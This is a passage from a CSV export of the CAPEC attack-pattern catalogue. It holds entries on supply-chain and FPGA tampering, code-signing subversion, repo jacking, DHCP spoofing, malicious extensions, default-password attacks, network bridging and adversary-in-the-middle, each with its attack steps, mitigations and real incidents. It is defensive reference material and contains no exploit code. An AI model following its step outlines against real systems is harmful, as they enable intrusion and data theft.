unware of any malicious modifications.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::An adversary would need to have access to a targeted developer’s software development environment, including to their software build processes, where the adversary could ensure code maliciously tainted prior to a build process is included in software packages built.::\",\"::SKILL:The adversary must have the skills to infiltrate a developer’s software development/build environment and to implant malicious code in developmental software code, a build server, or a software repository containing dependency code, which would be referenced to be included during the software build process.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Modify Data::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Have a security concept of operations (CONOPS) for the IDE that includes: Protecting the IDE via logical isolation using firewall and DMZ technologies/architectures; Maintaining strict security administration and configuration management of configuration management tools, developmental software and dependency code repositories, compilers, and system build tools.::Employ intrusion detection and malware detection capabilities on IDE systems where feasible.::\",\"::An adversary who has infiltrated an organization’s build environment maliciously alters code intended to be included in a product’s software build via software dependency inclusion, part of the software build process. When the software product has been built, the developer electronically signs the finished product using their signing key. The recipient of the software product, an end user/customer, believes the software to reflect the developer’s intent with respect to functionality unaware of the adversary’s malicious intent harbored within.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::\",\"\",\n674,\"Design for FPGA Maliciously Altered\",Detailed,Stable,\"An adversary alters the functionality of a field-programmable gate array (FPGA) by causing an FPGA configuration memory chip reload in order to introduce a malicious function that could result in the FPGA performing or enabling malicious functions on a host system. Prior to the memory chip reload, the adversary alters the program for the FPGA by adding a function to impact system operation.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:447::\",\"\",\"::An adversary would need to have access to FPGA programming/configuration-related systems in a chip maker’s development environment where FPGAs can be initially configured prior to delivery to a customer or have access to such systems in a customer facility where end-user FPGA configuration/reconfiguration can be performed.::\",\"::SKILL:An adversary would need to be skilled in FPGA programming in order to create/manipulate configurations in such a way that when loaded into an FPGA, the end user would be able to observe through testing all user-defined required functions but would be unaware of any additional functions the adversary may have introduced.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Alter Execution Logic::\",\"::Utilize DMEA’s (Defense Microelectronics Activity) Trusted Foundry Program members for acquisition of microelectronic components.::Ensure that each supplier performing hardware development implements comprehensive, security-focused configuration management including for FPGA programming and program uploads to FPGA chips.::Require that provenance of COTS microelectronic components be known whenever procured.::Conduct detailed vendor assessment before acquiring COTS hardware.::\",\"::An adversary with access and the ability to alter the configuration/programming of FPGAs in organizational systems, introduces a trojan backdoor that can be used to alter the behavior of the original system resulting in, for example, compromise of confidentiality of data being processed.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n675,\"Retrieve Data from Decommissioned Devices\",Standard,Stable,\"An adversary obtains decommissioned, recycled, or discarded systems and devices that can include an organization’s intellectual property, employee data, and other types of controlled information. Systems and devices that have reached the end of their lifecycles may be subject to recycle or disposal where they can be exposed to adversarial attempts to retrieve information from internal memory chips and storage devices that are part of the system.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:116::NATURE:CanPrecede:CAPEC ID:37::\",\"\",\"::An adversary needs to have access to electronic data processing equipment being recycled or disposed of (e.g., laptops, servers) at a collection location and the ability to take control of it for the purpose of exploiting its content.::\",\"::SKILL:An adversary may need the ability to mount printed circuit boards and target individual chips for exploitation.:LEVEL:High::SKILL:An adversary needs the technical skills required to extract solid state drives, hard disk drives, and other storage media to host on a compatible system or harness to gain access to digital content.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Accountability:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Backup device data before erasure to retain intellectual property and inside knowledge.::Overwrite data on device rather than deleting. Deleted data can still be recovered, even if the device trash can is emptied. Rewriting data removes any trace of the old data. Performing multiple overwrites followed by a zeroing of the device (overwriting with all zeros) is good practice.::Use a secure erase software.::Physically destroy the device if it is not intended to be reused. Using a specialized service to disintegrate, burn, melt or pulverize the device can be effective, but if those services are inaccessible, drilling nails or holes, or smashing the device with a hammer can be effective. Do not burn, microwave, or pour acid on a hard drive.::Physically destroy memory and SIM cards for mobile devices not intended to be reused.::Ensure that the user account has been terminated or switched to a new device before destroying.::\",\"::A company is contracted by an organization to provide data destruction services for solid state and hard disk drives being discarded. Prior to destruction, an adversary within the contracted company copies data from select devices, violating the data confidentiality requirements of the submitting organization.::\",\"::1266::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1052:ENTRY NAME:Exfiltration Over Physical Medium::\",\"\",\n677,\"Server Motherboard Compromise\",Detailed,Draft,\"Malware is inserted in a server motherboard (e.g., in the flash memory) in order to alter server functionality from that intended. The development environment or hardware/software support activity environment is susceptible to an adversary inserting malicious software into hardware components during development or update.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:534::\",\"\",\"::An adversary with access to hardware/software processes and tools within the development or hardware/software support environment can insert malicious software into hardware components during development or update/maintenance.::\",\"\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Purchase IT systems, components and parts from government approved vendors whenever possible.::Establish diversity among suppliers.::Conduct rigorous threat assessments of suppliers.::Require that Bills of Material (BoM) for critical parts and components be certified.::Utilize contract language requiring contractors and subcontractors to flow down to subcontractors and suppliers SCRM and SCRA (Supply Chain Risk Assessment) requirements.::Establish trusted supplier networks.::\",\"::Malware is inserted into the Unified Extensible Firmware Interface (UEFI) software that resides on a flash memory chip soldered to a computer’s motherboard. It is the first thing to turn on when a system is booted and is allowed access to almost every part of the operating system. Hence, the malware will have extensive control over operating system functions and persist after system reboots. [REF-685]::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n678,\"System Build Data Maliciously Altered\",Detailed,Draft,\"During the system build process, the system is deliberately misconfigured by the alteration of the build data. Access to system configuration data files and build processes is susceptible to deliberate misconfiguration of the system.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::An adversary has access to the data files and processes used for executing system configuration and performing the build.::\",\"\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Access Control:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Read Data::\",\"::Implement configuration management security practices that protect the integrity of software and associated data.::Monitor and control access to the configuration management system.::Harden centralized repositories against attack.::Establish acceptance criteria for configuration management check-in to assure integrity.::Plan for and audit the security of configuration management administration processes.::Maintain configuration control over operational systems.::\",\"::‘Make’ is a program used for building executable programs and libraries from source code by executing commands and following rules in a ‘makefile’. It can create a malicious executable if commands or dependency paths in the makefile are maliciously altered to execute an unwanted command or reference as a dependency maliciously altered code.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::\",\"\",\n68,\"Subvert Code-signing Facilities\",Standard,Draft,\"Many languages use code signing facilities to vouch for code's identity and to thus tie code to its assigned privileges within an environment. Subverting this mechanism can be instrumental in an attacker escalating privilege. Any means of subverting the way that a virtual machine enforces code signing classifies for this style of attack.\",\"\",Low,Very High,\"::NATURE:ChildOf:CAPEC ID:233::\",\"\",\"::A framework-based language that supports code signing (such as, and most commonly, Java or .NET)::Deployed code that has been signed by its authoring vendor, or a partner.::The attacker will, for most circumstances, also need to be able to place code in the victim container. This does not necessarily mean that they will have to subvert host-level security, except when explicitly indicated.::\",\"::SKILL:Subverting code signing is not a trivial activity. Most code signing and verification schemes are based on use of cryptography and the attacker needs to have an understanding of these cryptographic operations in good detail. Additionally the attacker also needs to be aware of the way memory is assigned and accessed by the container since, often, the only way to subvert code signing would be to patch the code in memory. Finally, a knowledge of the platform specific mechanisms of signing and verifying code is a must.:LEVEL:High::\",\"::The Attacker needs no special resources beyond the listed prerequisites in order to conduct this style of attack.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::A given code signing scheme may be fallible due to improper use of cryptography. Developers must never roll out their own cryptography, nor should existing primitives be modified or ignored.::If an attacker cannot attack the scheme directly, they might try to alter the environment that affects the signing and verification processes. A possible mitigation is to avoid reliance on flags or environment variables that are user-controllable.::\",\"::In old versions (prior to 3.0b4) of the Netscape web browser Attackers able to foist a malicious Applet into a client's browser could execute the Magic Coat attack. In this attack, the offending Applet would implement its own getSigners() method. This implementation would use the containing VM's APIs to acquire other Applet's signatures (by calling _their_ getSigners() method) and if any running Applet had privileged-enough signature, the malicious Applet would have inherited that privilege just be (metaphorically) donning the others' coats.::Some (older) web browsers allowed scripting languages, such as JavaScript, to call signed Java code. In these circumstances, the browser's VM implementation would choose not to conduct stack inspection across language boundaries (from called signed Java to calling JavaScript) and would short-circuit true at the language boundary. Doing so meant that the VM would allow any (unprivileged) script to call privileged functions within signed code with impunity, causing them to fall prey to luring attacks.::The ability to load unsigned code into the kernel of earlier versions of Vista and bypass integrity checking is an example of such subversion. In the proof-of-concept, it is possible to bypass the signature-checking mechanism Vista uses to load device drivers.::\",\"::325::328::1326::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1553.002:ENTRY NAME:Subvert Trust Controls: Code Signing::\",\"\",\n691,\"Spoof Open-Source Software Metadata\",Standard,Stable,\"An adversary spoofs open-source software metadata in an attempt to masquerade malicious software as popular, maintained, and trusted.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:690::NATURE:CanPrecede:CAPEC ID:184::NATURE:CanPrecede:CAPEC ID:444::NATURE:PeerOf:CAPEC ID:630::\",\"\",\"::Identification of a popular open-source component whose metadata is to be spoofed.::\",\"::SKILL:Ability to spoof a variety of software metadata to convince victims the source is trusted.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Accountability:TECHNICAL IMPACT:Hide Activities::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Alter Execution Logic:TECHNICAL IMPACT:Gain Privileges::\",\"::Before downloading open-source software, perform precursory metadata checks to determine the author(s), frequency of updates, when the software was last updated, and if the software is widely leveraged.::Within package managers, look for conflicting or non-unique repository references to determine if multiple packages share the same repository reference.::Reference vulnerability databases to determine if the software contains known vulnerabilities.::Only download open-source software from reputable hosting sites or package managers.::Only download open-source software that has been adequately signed by the developer(s). For repository commits/tags, look for the Verified status and for developers leveraging Vigilant Mode (GitHub) or similar modes.::After downloading open-source software, ensure integrity values have not changed.::Before executing or incorporating the software, leverage automated testing techniques (e.g., static and dynamic analysis) to determine if the software behaves maliciously.::\",\"::An adversary provides a malicious open-source library, claiming to provide extended logging features and functionality, and spoofs the metadata with that of a widely used legitimate library. The adversary then tricks victims into including this library in their underlying application. Once the malicious software is incorporated into the application, the adversary is able to manipulate and exfiltrate log data.::\",\"::494::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.001:ENTRY NAME:Supply Chain Compromise: Compromise Software Dependencies and Development Tools::::TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::\",\"\",\n694,\"System Location Discovery\",Standard,Stable,\"An adversary collects information about the target system in an attempt to identify the system's geographical location. Information gathered could include keyboard layout, system language, and timezone. This information may benefit an adversary in confirming the desired target and/or tailoring further attacks.\",\"\",High,Very Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[System Locale Information Discovery] The adversary examines system information from various sources such as registry and native API functions and correlates the gathered information to infer the geographical location of the target system:TECHNIQUE:Registry Query: Query the registry key HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlContentIndexLanguageLanguage_Dialect on Windows to obtain system language, ComputerHKEY_CURRENT_USERKeyboard LayoutPreload to obtain the hexadecimal language IDs of the current user's preloaded keyboard layouts, and ComputerHKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTimeZoneInformation to obtain the system timezone configuration:TECHNIQUE:Native API Requests: Parse the outputs of Windows API functions GetTimeZoneInformation, GetUserDefaultUILanguage, GetSystemDefaultUILanguage, GetKeyboardLayoutList and GetUserDefaultLangID to obtain information about languages, keyboard layouts, and timezones installed on the system or on macOS or Linux systems, query locale to obtain the $LANG environment variable and view keyboard layout information or use timeanddatectl status to show the system clock settings.:TECHNIQUE:Read Configuration Files: For macOS and Linux-based systems, view the /etc/vconsole.conf file to get information about the keyboard mapping and console font.::\",\"::The adversary must have some level of access to the system and have a basic understanding of the operating system in order to query the appropriate sources for relevant information.::\",\"::SKILL:The adversary must know how to query various system sources of information respective of the system's operating system to obtain the relevant information.:LEVEL:Low::\",\"::The adversary requires access to the target's operating system tools to query relevant system information. On windows, registry queries can be conducted with powershell, wmi, or regedit. On Linux or macOS, queries can be performed with through a shell.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::To reduce the amount of information gathered, one could disable various geolocation features of the operating system not required for system operation.::\",\"\",\"::497::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1614:ENTRY NAME:System Language Discovery::\",\"\",\n695,\"Repo Jacking\",Detailed,Stable,\"An adversary takes advantage of the redirect property of directly linked Version Control System (VCS) repositories to trick users into incorporating malicious code into their applications.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:616::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target] The adversary must first identify a target repository that is commonly used and whose owner/maintainer has either changed/deleted their username or transferred ownership of the repository and then deleted their account. The target should typically be a popular and widely used package, as to increase the scope of the attack.::STEP:2:PHASE:Experiment:DESCRIPTION:[Recreate initial repository path] The adversary re-registers the account that was renamed/deleted by the target repository's owner/maintainer and recreates the target repository with malicious code intended to exploit an application. These steps may need to happen in reverse (i.e., recreate repository and then rename an existing account to the target account) if protections are in place to prevent repository reuse.::STEP:3:PHASE:Exploit:DESCRIPTION:[Exploit victims] The adversary's malicious code is incorporated into applications that directly reference the initial repository, which further allows the adversary to conduct additional attacks.::\",\"::Identification of a popular repository that may be directly referenced in numerous software applications::A repository owner/maintainer who has recently changed their username or deleted their account::\",\"::SKILL:Ability to create an account on a VCS hosting site and recreate an existing directory structure.:LEVEL:Low::SKILL:Ability to create malware that can exploit various software applications.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Modify Data::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Alter Execution Logic:TECHNICAL IMPACT:Gain Privileges::\",\"::Leverage dedicated package managers instead of directly linking to VCS repositories.::Utilize version pinning and lock files to prevent use of maliciously modified repositories.::Implement vendoring (i.e., including third-party dependencies locally) and leverage automated testing techniques (e.g., static analysis) to determine if the software behaves maliciously.::Leverage automated tools, such as Checkmarx's ChainJacking tool, to determine susceptibility to Repo Jacking attacks.::\",\"::In May 2022, the CTX Python package and PhPass PHP package were both exploited by the same adversary via Repo Jacking attacks. For the CTX package, the adversary performed an account takeover via a password reset, due to an expired domain-hosting email. The attack on PhPass entailed bypassing GitHub's authentication for retired repositories. In both cases, sensitive data in the form of API keys and passwords, each stored in the form of environment variables, were exfiltrated. [REF-732] [REF-733]::In October 2021, the popular JavaScript library UAParser.js was exploited via the takeover of the author's Node Package Manager (NPM) account. The adversary-provided malware downloaded and executed binaries from a remote server to conduct crypto-mining and to exfiltrate sensitive data on Windows systems. This was a wide-scale attack as the package receives 8 to 9 million downloads per week. [REF-732]::\",\"::494::829::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.001:ENTRY NAME:Supply Chain Compromise: Compromise Software Dependencies and Development Tools::\",\"\",\n697,\"DHCP Spoofing\",Standard,Stable,\"An adversary masquerades as a legitimate Dynamic Host Configuration Protocol (DHCP) server by spoofing DHCP traffic, with the goal of redirecting network traffic or denying service to DHCP.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:194::NATURE:CanPrecede:CAPEC ID:158::NATURE:CanPrecede:CAPEC ID:94::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Exsisting DHCP lease] An adversary observes network traffic and waits for an existing DHCP lease to expire on a target machine in the LAN.:TECHNIQUE:Adversary observes LAN traffic for DHCP solicitations::STEP:2:PHASE:Experiment:DESCRIPTION:[Capture the DHCP DISCOVER message] The adversary captures DISCOVER messages and crafts OFFER responses for the identified target MAC address. The success of this attack centers on the capturing of and responding to these DISCOVER messages.:TECHNIQUE:Adversary captures and responds to DHCP DISCOVER messages tailored to the target subnet.::STEP:3:PHASE:Exploit:DESCRIPTION:[Compromise Network Access and Collect Network Activity] An adversary successfully acts as a rogue DHCP server by redirecting legitimate DHCP requests to itself.:TECHNIQUE:Adversary sends repeated DHCP REQUEST messages to quickly lease all the addresses within network's DHCP pool and forcing new DHCP requests to be handled by the rogue DHCP server.::\",\"::The adversary must have access to a machine within the target LAN which can send DHCP offers to the target.::\",\"::SKILL:The adversary must identify potential targets for DHCP Spoofing and craft network configurations to obtain the desired results.:LEVEL:Medium::\",\"::The adversary requires access to a machine within the target LAN on a network which does not secure its DHCP traffic through MAC-Forced Forwarding, port security, etc.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:SCOPE:Access Control:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::\",\"::Design: MAC-Forced Forwarding::Implementation: Port Security and DHCP snooping::Implementation: Network-based Intrusion Detection Systems::\",\"::In early 2019, Microsoft patched a critical vulnerability (CVE-2019-0547) in the Windows DHCP client which allowed remote code execution via crafted DHCP OFFER packets. [REF-739]::\",\"::923::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1557.003:ENTRY NAME:Adversary-in-the-Middle: DHCP Spoofing::\",\"\",\n698,\"Install Malicious Extension\",Detailed,Stable,\"An adversary directly installs or tricks a user into installing a malicious extension into existing trusted software, with the goal of achieving a variety of negative technical impacts.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:542::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target(s)] The adversary must first identify target software that allows for extensions/plugins and which they wish to exploit, such as a web browser or desktop application. To increase the attack space, this will often be popular software with a large user-base.::STEP:2:PHASE:Experiment:DESCRIPTION:[Create malicious extension] Having identified a suitable target, the adversary crafts a malicious extension/plugin that can be installed by the underlying target software. This malware may be targeted to execute on specific operating systems or be operating system agnostic.::STEP:3:PHASE:Exploit:DESCRIPTION:[Install malicious extension] The malicious extension/plugin is installed by the underlying target software and executes the adversary-created malware, resulting in a variety of negative technical impacts.:TECHNIQUE:Adversary-Installed: Having already compromised the target system, the adversary simply installs the malicious extension/plugin themself.:TECHNIQUE:User-Installed: The adversary tricks the user into installing the malicious extension/plugin, via means such as social engineering, or may upload the malware on a reputable extension/plugin hosting site and wait for unknowing victims to install the malicious component.::\",\"::The adversary must craft malware based on the type of software and system(s) they intend to exploit.::If the adversary intends to install the malicious extension themself, they must first compromise the target machine via some other means.::\",\"::SKILL:Ability to create malicious extensions that can exploit specific software applications and systems.:LEVEL:Medium::SKILL:Optional: Ability to exploit target system(s) via other means in order to gain entry.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:SCOPE:Access Control:TECHNICAL IMPACT:Modify Data::SCOPE:Authorization:SCOPE:Access Control:TECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Alter Execution Logic:TECHNICAL IMPACT:Gain Privileges::\",\"::Only install extensions/plugins from official/verifiable sources.::Confirm extensions/plugins are legitimate and not malware masquerading as a legitimate extension/plugin.::Ensure the underlying software leveraging the extension/plugin (including operating systems) is up-to-date.::Implement an extension/plugin allow list, based on the given security policy.::If applicable, confirm extensions/plugins are properly signed by the official developers.::For web browsers, close sessions when finished to prevent malicious extensions/plugins from executing the the background.::\",\"::In January 2018, Palo Alto's Unit 42 reported that a malicious Internet Information Services (IIS) extension they named RGDoor was used to create a backdoor into several Middle Eastern government organizations, as well as a financial institution and an educational institution. This malware was used in conjunction with the TwoFace webshell and allowed the adversaries to upload/download files and execute unauthorized commands. [REF-740]::In December 2018, it was reported that North Korea-based APT Kimusky (also known as Velvet Chollima) infected numerous legitimate academic organizations within the U.S., many specializing in biomedical engineering, with a malicious Google Chrome extension. Dubbed Operation STOLEN PENCIL, the attack entailed conducting spear-phishing attacks to trick victims into installing a malicious PDF reader named Auto Font Manager. Once installed, the malware allowed adversaries to steal cookies and site passwords, as well as forward emails from some compromised accounts. [REF-741]::\",\"::507::829::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1176:ENTRY NAME:Browser Extensions::::TAXONOMY NAME:ATTACK:ENTRY ID:1505.004:ENTRY NAME:Server Software Component: IIS Components::\",\"\",\n70,\"Try Common or Default Usernames and Passwords\",Detailed,Draft,\"An adversary may try certain common or default usernames and passwords to gain access into the system and perform unauthorized actions. An adversary may try an intelligent brute force using empty passwords, known vendor default credentials, as well as a dictionary of common usernames and passwords. Many vendor products come preconfigured with default (and thus well-known) usernames and passwords that should be deleted prior to usage in a production environment. It is a common mistake to forget to remove these default login credentials. Another problem is that users would pick very simple (common) passwords (e.g. secret or password) that make it easier for the attacker to gain access to the system compared to using a brute force attack or even a dictionary attack using a full dictionary.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:49::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::\",\"\",\"::The system uses one factor password based authentication.The adversary has the means to interact with the system.::\",\"::SKILL:An adversary just needs to gain access to common default usernames/passwords specific to the technologies used by the system. Additionally, a brute force attack leveraging common passwords can be easily realized if the user name is known.:LEVEL:Low::\",\"::Technology or vendor specific list of default usernames and passwords.::\",\"::Many incorrect login attempts are detected by the system.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Delete all default account credentials that may be put in by the product vendor.::Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.::Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.::Passwords need to be recycled to prevent aging, that is every once in a while a new password must be chosen.::\",\"::A user sets their password to 123 or intentionally leaves their password blank. If the system does not have password strength enforcement against a sound password policy, this password may be admitted. Passwords like these two examples are two simple and common passwords that are easily able to be guessed by the adversary.::Cisco 2700 Series Wireless Location Appliances (version 2.1.34.0 and earlier) have a default administrator username root with a password password. This allows remote attackers to easily obtain administrative privileges. See also: CVE-2006-5288::In April 2019, adversaries attacked several popular IoT devices (a VOIP phone, an office printer, and a video decoder) across multiple customer locations. An investigation conducted by the Microsoft Security Resposne Center (MSRC) discovered that these devices were used to gain initial access to corporate networks. In two of the cases, the passwords for the devices were deployed without changing the default manufacturer’s passwords and in the third instance the latest security update had not been applied to the device. [REF-572]::\",\"::521::262::263::798::654::308::309::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1078.001:ENTRY NAME:Valid Accounts:Default Accounts::\",\"\",\n700,\"Network Boundary Bridging\",Standard,Draft,\"An adversary which has gained elevated access to network boundary devices may use these devices to create a channel to bridge trusted and untrusted networks. Boundary devices do not necessarily have to be on the network’s edge, but rather must serve to segment portions of the target network the adversary wishes to cross into.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:161::NATURE:CanFollow:CAPEC ID:70::NATURE:CanFollow:CAPEC ID:560::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify potential targets] An adversary identifies network boundary devices that can be compromised.:TECHNIQUE:The adversary traces network traffic to identify which devices the traffic flows through. Additionally, the adversary can identify devices using fingerprinting methods or locating the management page to determine identifying information about the device.::STEP:2:PHASE:Experiment:DESCRIPTION:[Compromise targets] The adversary must compromise the identified targets in the previous step.:TECHNIQUE:Once the device is identified, the adversary can attempt to input known default credentials for the device to gain access to the management console.:TECHNIQUE:Adversaries with sufficient identifying knowledge about the target device can exploit known vulnerabilities in network devices to obtain administrative access.::STEP:3:PHASE:Exploit:DESCRIPTION:[Bridge Networks] The adversary changes the configuration of the compromised network device to connect the networks the device was segmenting. Depending on the type of network boundary device and its capabilities, bridging can be implemented using various methods.:TECHNIQUE:The adversary can abuse Network Address Translation (NAT) in firewalls and routers to manipulate traffic flow to their own design. With control of the network device, the adversary can manipulate NAT by either using existing configurations or creating their own to allow two previously unconnected networks to communicate.:TECHNIQUE:Some network devices can be configured to become a proxy server. Adversaries can set up or exploit an existing proxy server on compromised network devices to create a bridge between separate networks.::\",\"::The adversary must have control of a network boundary device.::\",\"::SKILL:The adversary must understand how to manage the target network device to create or edit policies which will bridge networks.:LEVEL:Medium::\",\"::The adversary requires either high privileges or full control of a boundary device on a target network.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:TECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Integrity:SCOPE:Authorization:TECHNICAL IMPACT:Alter Execution Logic:TECHNICAL IMPACT:Hide Activities::\",\"::Design: Ensure network devices are storing credentials in encrypted stores::Design: Follow the principle of least privilege and restrict administrative duties to as few accounts as possible. Ensure these privileged accounts are secured with strong credentials which do not overlap with other network devices.::Configuration: When possible, configure network boundary devices to use MFA.::Configuration: Change the default configuration for network devices to harden their security profiles. Default configurations are often enabled with insecure features to allow ease of installation and management. However, these configurations can be easily discovered and exploited by adversaries.::Implementation: Perform integrity checks on audit logs for network device management and review them to identify abnormalities in configurations.::Implementation: Prevent network boundary devices from being physically accessed by unauthorized personnel to prevent tampering.::\",\"::In November 2016, a Smart Install Exploitation Tool was released online which takes advantage of Cisco’s unauthenticated SMI management protocol to download a target’s current configuration files. Adversaries can use this tool to overwrite files to modify the device configurations, or upload maliciously modified OS or firmware to enable persistence. Once the adversary has access to the device’s configurations, they could modify it to redirect network traffic through other network infrastructure.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1599:ENTRY NAME:Network Boundary Bridging::\",\"\",\n94,\"Adversary in the Middle (AiTM)\",Meta,Stable,\"An adversary targets the communication between two components (typically client and server), in order to alter or obtain data from transactions. A general approach entails the adversary placing themself within the communication channel between the two components.\",\"::TERM:Man-in-the-Middle / MITM:DESCRIPTION:::TERM:Person-in-the-Middle / PiTM:DESCRIPTION:::TERM:Monkey-in-the-Middle:DESCRIPTION:::TERM:Monster-in-the-Middle:DESCRIPTION:::TERM:On-path Attacker:DESCRIPTION:::\",High,Very High,\"::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:668::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Communication Mechanism] The adversary determines the nature and mechanism of communication between two components, looking for opportunities to exploit.:TECHNIQUE:Perform a sniffing attack and observe communication to determine a communication protocol.:TECHNIQUE:Look for application documentation that might describe a communication mechanism used by a target.::STEP:2:PHASE:Experiment:DESCRIPTION:[Position In Between Targets] The adversary inserts themself into the communication channel initially acting as a routing proxy between the two targeted components.:TECHNIQUE:Install spyware on a client that will intercept outgoing packets and route them to their destination as well as route incoming packets back to the client.:TECHNIQUE:Exploit a weakness in an encrypted communication mechanism to gain access to traffic. Look for outdated mechanisms such as SSL.::STEP:3:PHASE:Exploit:DESCRIPTION:[Use Intercepted Data Maliciously] The adversary observes, filters, or alters passed data of its choosing to gain access to sensitive information or to manipulate the actions of the two target components for their own purposes.:TECHNIQUE:Prevent some messages from reaching their destination, causing a denial of service.::\",\"::There are two components communicating with each other.::An attacker is able to identify the nature and mechanism of communication between the two target components.::An attacker can eavesdrop on the communication between the target components.::Strong mutual authentication is not used between the two target components yielding opportunity for attacker interposition.::The communication occurs in clear (not encrypted) or with insufficient and spoofable encryption.::\",\"::SKILL:This attack can get sophisticated since the attack may use cryptography.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Ensure Public Keys are signed by a Certificate Authority::Encrypt communications using cryptography (e.g., SSL/TLS)::Use Strong mutual authentication to always fully authenticate both ends of any communications channel.::Exchange public keys using a secure channel::\",\"::In 2017, security researcher Jerry Decime discovered that Equifax mobile applications were not leveraging HTTPS in all areas. Although authentication was properly utilizing HTTPS, in addition to validating the root of trust of the server certificate, other areas of the application were using HTTP to communicate. Adversaries could then conduct MITM attacks on rogue WiFi or cellular networks and hijack the UX. This further allowed the adversaries to prompt users for sensitive data, which could then be obtained in the plaintext response. [REF-636]::\",\"::300::290::593::287::294::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1557:ENTRY NAME:Adversary-in-the-Middle::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Man-in-the-middle attack::\",\"\",\n98,\"Phishing\",Standard,Draft,\"Phishing is a social engineering technique where an attacker masquerades as a legitimate entity with which the victim might do business in order to prompt the user to reveal some confidential information (very frequently authentication credentials) that can later be used by an attacker. Phishing is essentially a form of information gathering or fishing for 